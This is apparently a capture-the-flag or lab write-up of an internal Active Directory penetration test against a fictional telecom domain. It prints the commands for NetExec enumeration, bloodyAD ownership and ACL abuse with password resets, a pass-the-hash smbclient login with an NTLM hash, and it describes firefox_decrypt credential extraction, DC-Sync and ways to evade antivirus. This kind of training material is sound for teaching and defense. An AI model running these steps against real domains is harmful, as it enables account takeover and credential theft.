StellarComms

StellarComms

Objective

Stellar Communications, a regional telecommunications provider, has retained the Hack Smarter Red Team to conduct a covert internal network penetration test. The client is concerned about the resilience of their internal Active Directory infrastructure against insider threats and compromised VPN endpoints.

Your objective is to simulate a compromised remote worker, pivot through the internal network, and demonstrate the ability to compromise high-value targets.

Our initial access team has successfully established a VPN tunnel into the environment. We have identified a valid username, likely belonging to a new hire or junior staff member.

Valid User:
    Username: junior.analyst
    Password: Unknown
Valid User:
    Username: junior.analyst
    Password: Unknown

There is only one target machine which I assume is the domain controller:

Assessment

I started the assessment by running NetExec against the target machine to identify the domain name and host name:

┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ nxc smb 10.0.31.116                                                                                                   
SMB         10.0.31.116     445    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:True) (SMBv1:None) (Null Auth:True)
┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ nxc smb 10.0.31.116                                                                                                   
SMB         10.0.31.116     445    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:True) (SMBv1:None) (Null Auth:True)

As shown in the output above, the host name is DC-STELLAR and the domain name is stellarcomms.local. I inserted the following entry inside my /etc/hosts file:

10.0.31.116   dc-stellar.stellarcomms.local stellarcomms.local dc-stellar
10.0.31.116   dc-stellar.stellarcomms.local stellarcomms.local dc-stellar

I inserted the identified username junior.analyst inside a file called usernames.txt on my machine:

junior.analyst
┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ cat usernames.txt                                                                                                                                              
junior.analyst

When reading through the documents beginning with Leo word, I notice it mentions a VHOST by the name of portal.stellarcomms.local:

As shown in the output above, we could potentially use default credentials but this will trigger automated security alerts. However, after adding this inside my /etc/hosts file, it turned out to be a dead end. I did further enumeration like VHOST, directory, and pages fuzzing but they did not lead to anything.

When trying to open the PDF documents, I notice they are damaged:

However, this is fixable. I browsed to the following URL first to fix these documents:

https://www.ilovepdf.com/
https://www.ilovepdf.com/

I uploaded the Stellar_UserGuide.pdf file to the website. Then the website automatically repaired the broken document for me. When viewing the content of the document, I obtained the default password:

When checking this password Galaxy123! against the domain user junior.analyst, I get a hit:

When visualising this relationship, I notice our user junior.analyst has WriteOwner over the stellarops-control group:

I can abuse this to become the owner of the group, and make junior.analyst a member too. Using bloodyAD, I became the owner of the stellarops-control group now:

┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ bloodyAD --host dc-stellar.stellarcomms.local -u junior.analyst -p 'Galaxy123!' set owner 'stellarops-control' 'junior.analyst'
[+] Old owner S-1-5-21-1085439814-3345093241-3808503133-512 is now replaced by junior.analyst on stellarops-control
┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ bloodyAD --host dc-stellar.stellarcomms.local -u junior.analyst -p 'Galaxy123!' set owner 'stellarops-control' 'junior.analyst'
[+] Old owner S-1-5-21-1085439814-3345093241-3808503133-512 is now replaced by junior.analyst on stellarops-control

Then I changed the password of the ops.controller domain user to Pwned123 using bloodyAD:

┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]

[+] Password changed successfully!

Maybe I can extract credentials (passwords, cookies, etc.,) from the user's profile. Downloading tools such as LaZagne.exe can extract the password, but it will also lead to detection by the AV on the machine. Another way to bypass this is to make a copy of the Mozilla directory and run tools such as firefox_decrypt to extract credentials.

astro.researcher:Cosmos@42
astro.researcher:Cosmos@42

When looking up what DACL privileges this user has, I notice it has WriteDacl over the eng.payload domain user:

Now I can obtain GenericAll (Full Control) over the eng.payload user and change its password. Using bloodyAD, I achieved this and changed the password of eng.payload to Pwned123:

┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ bloodyAD --host stellarcomms.local -u astro.researcher -p 'Cosmos@42' add genericAll 'eng.payload' 'astro.researcher'
[+] astro.researcher has now GenericAll on eng.payload
                                                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ bloodyAD --host stellarcomms.local -u astro.researcher -p 'Cosmos@42' set password 'eng.payload' 'Pwned123'          
[+] Password changed successfully!
┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ bloodyAD --host stellarcomms.local -u astro.researcher -p 'Cosmos@42' add genericAll 'eng.payload' 'astro.researcher'
[+] astro.researcher has now GenericAll on eng.payload
                                                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ bloodyAD --host stellarcomms.local -u astro.researcher -p 'Cosmos@42' set password 'eng.payload' 'Pwned123'          
[+] Password changed successfully!

When checking what privileges this GMSA has, I notice it has the ability to perform DC-Sync attacks:

Then using this GMSA, I performed a DC-Sync attack to retreive the NTLM hash of the domain administrator:

Since AV is active on the machine, running tools like psexec and wmiexec can lead to detection. Another way is to use smbclient to browse the C$ share to access the files on the domain controller. Using this technique, I grabbed the root.txt flag:

┌──(kali㉿kali)-[~/Desktop/Labs/StellarComms]
└─$ smbclient //dc-stellar.stellarcomms.local/C$ -U stellarcomms.local/Administrator --pw-nt-hash d3a97bfa75ebed92165ea2d67cd21002
